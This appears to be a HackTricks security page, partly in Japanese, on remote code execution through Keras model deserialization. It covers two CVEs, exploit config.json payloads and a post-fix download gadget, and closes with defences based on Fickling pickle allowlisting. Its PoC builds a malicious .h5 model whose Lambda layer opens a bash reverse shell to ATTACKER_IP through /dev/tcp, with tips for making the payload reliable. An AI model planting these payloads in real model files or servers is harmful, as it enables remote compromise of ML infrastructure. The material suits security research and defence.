# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

このページは、Keras model deserialization pipeline に対する実践的なエクスプロイト手法を要約し、ネイティブ .keras フォーマットの内部構造と attack surface を説明し、Model File Vulnerabilities (MFVs) と post-fix gadgets を見つけるための研究者向けツールキットを提供します。

## .keras model format internals

A .keras file is a ZIP archive containing at least:
- metadata.json – 一般的な情報（例: Keras version）
- config.json – モデルアーキテクチャ（primary attack surface）
- model.weights.h5 – 重み（HDF5）

The config.json drives recursive deserialization: Keras imports modules, resolves classes/functions and reconstructs layers/objects from attacker-controlled dictionaries.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- module/class_name キーからのモジュールのインポートとシンボル解決
- from_config(...) または constructor 呼び出し（attacker-controlled kwargs）
- ネストされたオブジェクト（activations, initializers, constraints, etc.）への再帰

Historically, this exposed three primitives to an attacker crafting config.json:
- どのモジュールがインポートされるかを制御できること
- どの classes/functions が解決されるかを制御できること
- constructors/from_config に渡される kwargs を制御できること

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() used python_utils.func_load(...) which base64-decodes and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras はデフォルトで safe_mode=True を強制します。Lambda 内のシリアライズされた Python 関数は、ユーザーが明示的に safe_mode=False にしてオプトアウトしない限りブロックされます。

Notes:
- レガシー形式（古い HDF5 保存）や古いコードベースは最新のチェックを強制しない可能性があるため、被害者が古いローダーを使用している場合には “downgrade” スタイルの攻撃が依然として成立することがあります。

## CVE-2025-1550 – Keras ≤ 3.8 における任意のモジュールインポート

Root cause:
- _retrieve_class_or_fn が config.json からの攻撃者制御下のモジュール文字列を用いて、制限なしに importlib.import_module() を使用していました。
- Impact: 任意のインストール済みモジュール（または sys.path 上に攻撃者が配置したモジュール）のインポートが可能。インポート時のコードが実行され、その後攻撃者指定の kwargs でオブジェクトが構築されます。

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
セキュリティ改善 (Keras ≥ 3.9):
- モジュール許可リスト: インポートを公式エコシステムのモジュール（keras, keras_hub, keras_cv, keras_nlp）に制限
- Safe mode デフォルト: safe_mode=True は unsafe な Lambda シリアライズ関数の読み込みをブロック
- 基本的な型チェック: デシリアライズされたオブジェクトは期待される型と一致する必要がある

## 実用的な悪用: TensorFlow-Keras HDF5 (.h5) Lambda RCE

多くの本番スタックは依然としてレガシーな TensorFlow-Keras HDF5 モデルファイル (.h5) を受け入れています。攻撃者がサーバーが後でロードまたは推論を行うモデルをアップロードできる場合、Lambda レイヤーはロード/ビルド/推論時に任意の Python を実行できます。

デシリアライズ時または使用時に reverse shell を実行する悪意ある .h5 を作成するための最小限の PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
注意点と信頼性のヒント:
- Trigger points: コードは複数回実行される可能性がある（例: layer build/first call、model.load_model、predict/fit の実行時）。payloads を冪等にする。
- Version pinning: シリアライズの不一致を避けるため、victim’s TF/Keras/Python に合わせる。例えば、target がそれを使用している場合は、Python 3.8 + TensorFlow 2.13.1 下でアーティファクトをビルドする。
- Quick environment replication:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation: os.system("ping -c 1 YOUR_IP") のような無害なペイロードで実行を確認すると良い（例: tcpdump で ICMP を観測） — reverse shell に切り替える前に。

## allowlist 内の Post-fix gadget surface

allowlisting と safe mode を有効にしても、許可された Keras callables の中には依然として広いサーフェスが残ります。例えば、keras.utils.get_file は任意の URL をユーザーが選択できる場所にダウンロードできます。

許可された関数を参照する Lambda 経由の gadget（シリアライズされた Python bytecode ではない）:
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
重要な制限:
- Lambda.call() はターゲット callable を呼び出す際に入力テンソルを最初の positional argument として前置します。選択した gadgets は追加の positional arg を許容するか（または *args/**kwargs を受け入れる）必要があります。これにより利用可能な関数が制約されます。

## ML pickle import allowlisting for AI/ML models (Fickling)

多くの AI/ML モデル形式（PyTorch .pt/.pth/.ckpt、joblib/scikit-learn、古い TensorFlow アーティファクトなど）は Python の pickle データを埋め込んでいます。攻撃者は通常、pickle GLOBAL imports とオブジェクトコンストラクタを悪用して、ロード時に RCE やモデルの差し替えを行います。ブラックリストベースのスキャナは、新規または未リストの危険なインポートを見落とすことが多いです。

実用的なフェイルクローズ防御は、Python の pickle デシリアライザにフックを入れ、unpickling 中にレビュー済みの安全な ML 関連インポートのみを許可することです。Trail of Bits の Fickling はこの方針を実装しており、何千もの公開 Hugging Face pickle から構築した精選された ML インポート許可リストを提供します。

「安全な」インポートのセキュリティモデル（研究と実務から得た直感）: pickle によって使用されるインポート済みシンボルは同時に以下を満たす必要があります:
- コードを実行したり実行を引き起こさない（コンパイル済み／ソースコードオブジェクト、shelling out、hooks などを含まない）
- 任意の属性や要素の取得／設定を行わない
- pickle VM から他の Python オブジェクトをインポートしたり参照を取得したりしない
- 二次的なデシリアライザ（例: marshal、ネストした pickle）を、たとえ間接的であってもトリガーしない

Fickling の保護はプロセス起動時の可能な限り早い段階で有効にし、frameworks（torch.load, joblib.load, など）によって行われる pickle ロードが検査されるようにする:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
運用上のヒント:
- 必要に応じて hooks を一時的に無効化/再有効化できます:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 既知で問題のないモデルがブロックされている場合は、シンボルを確認した後で環境のallowlistを拡張してください:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling also exposes generic runtime guards if you prefer more granular control:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Prefer non-pickle model formats when possible (e.g., SafeTensors). If you must accept pickle, run loaders under least privilege without network egress and enforce the allowlist.

This allowlist-first strategy demonstrably blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.


## 研究者ツールキット

1) Allowlisted モジュールにおける体系的なガジェット発見

keras, keras_nlp, keras_cv, keras_hub の各モジュールで候補となる callables を列挙し、file／network／process／env に副作用を持つものを優先する。

<details>
<summary>allowlisted Keras モジュール内の潜在的に危険な callables を列挙する</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing (no .keras archive needed)

作成した dicts を直接 Keras deserializers に入力して、accepted params を学び、side effects を観察する。
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) クロスバージョンのプロービングとフォーマット

Keras は、ガードレールやフォーマットが異なる複数のコードベース／時代に存在します:
- TensorFlow built-in Keras: tensorflow/python/keras（レガシー、削除予定）
- tf-keras: 別途メンテナンスされている
- マルチバックエンド Keras 3（公式）: ネイティブな .keras を導入

複数のコードベースとフォーマット（.keras と legacy HDF5）でテストを繰り返し、回帰やガード不足を発見してください。

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
